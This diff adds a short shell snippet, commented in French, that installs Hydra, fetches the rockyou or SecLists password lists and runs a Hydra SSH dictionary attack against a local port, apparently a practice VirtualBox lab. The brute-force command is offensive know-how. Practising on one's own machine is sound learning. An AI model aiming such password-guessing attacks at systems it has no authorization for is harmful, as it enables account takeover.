@@ -1,0 +1,9 @@
+sudo apt install hydra
+# petite liste
+curl -L -o /tmp/rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# OU la grande liste
+git clone https://github.com/danielmiessler/SecLists.git /tmp/SecLists
+ls /tmp/SecLists/Passwords/Common-Credentials/
+
+hydra -l user@vbox -P /tmp/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ssh://127.0.0.1:2200 -t 4
